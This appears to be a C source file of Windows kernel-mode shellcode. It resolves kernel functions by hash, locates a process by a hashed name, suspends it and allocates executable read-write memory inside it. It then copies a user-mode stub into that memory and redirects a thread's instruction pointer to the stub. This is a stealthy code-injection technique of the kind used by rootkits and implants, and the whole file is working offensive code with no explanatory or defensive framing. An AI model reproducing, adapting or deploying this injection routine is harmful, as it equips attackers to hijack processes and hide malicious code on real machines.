
#include "common.h"

KENTRY void KmEntryPoint( VOID )
{
	PCONTEXT   ctx;
	NTSTATUS   ret;
	PVOID      mem;
	PVOID      ent;
	PVOID      ntp;
	PVOID      prc;
	PVOID      thd;
	ULONG_PTR  len;
	KAPC_STATE apc;
	KM_API     api;

	if ( (ntp = PcrGetModule( H_NTOSKRNL )) != NULL )
	{
		api.PsResumeProcess            = PeGetFuncEat( ntp, H_PSRESUMEPROCESS );
		api.PsSuspendProcess           = PeGetFuncEat( ntp, H_PSSUSPENDPROCESS );
		api.IoThreadToProcess          = PeGetFuncEat( ntp, H_IOTHREADTOPROCESS );
		api.PsSetContextThread         = PeGetFuncEat( ntp, H_PSSETCONTEXTTHREAD );
		api.PsGetContextThread         = PeGetFuncEat( ntp, H_PSGETCONTEXTTHREAD );
		api.ZwFreeVirtualMemory        = PeGetFuncEat( ntp, H_ZWFREEVIRTUALMEMORY );
		api.ObDereferenceObject        = PeGetFuncEat( ntp, H_OBDEREFERENCEOBJECT );
		api.KeStackAttachProcess       = PeGetFuncEat( ntp, H_KESTACKATTACHPROCESS );
		api.KeUnstackDetachProcess     = PeGetFuncEat( ntp, H_KEUNSTACKDETACHPROCESS );
		api.ZwAllocateVirtualMemory    = PeGetFuncEat( ntp, H_ZWALLOCATEVIRTUALMEMORY );
		api.PsLookupThreadByThreadId   = PeGetFuncEat( ntp, H_PSLOOKUPTHREADBYTHREADID );
		api.PsGetProcessImageFileName  = PeGetFuncEat( ntp, H_PSGETPROCESSIMAGEFILENAME );
		api.PsLookupProcessByProcessId = PeGetFuncEat( ntp, H_PSLOOKUPPROCESSBYPROCESSID );

		if ( (prc = ProcEnumProcess( &api, 0x5e3a79e0 )) != NULL )
		{
			api.KeStackAttachProcess( prc, &apc );
			
			if ( ! (ret = api.PsSuspendProcess( prc ))  )
			{
				if ( (thd = ProcEnumThreads( &api, prc )) != NULL )
				{
					if ( (ctx = ProcGetThreadCtx( &api, thd )) != NULL )
					{
						ent = CPTR( &EnterUmMode );
						len = UPTR( &LeaveUmMode ) - UPTR( &EnterUmMode );

						if ( (mem = ProcAllocateMem( &api, len, PAGE_EXECUTE_READWRITE )) != NULL )
						{
							__builtin_memcpy( mem, ent, len );

						#if defined(_WIN64)
							ctx->Rip = UPTR( mem );
							ctx->ContextFlags = CONTEXT_FULL;
						#else
							ctx->Eip = UPTR( mem );
							ctx->ContextFlags = CONTEXT_FULL;
						#endif

							ProcSetThreadCtx( &api, thd, ctx );
						};
					};
				};
				api.PsResumeProcess( prc );
			};

			api.KeUnstackDetachProcess( &apc );
		};
	};
};

UENTRY void UmEntryPoint( VOID )
{

};
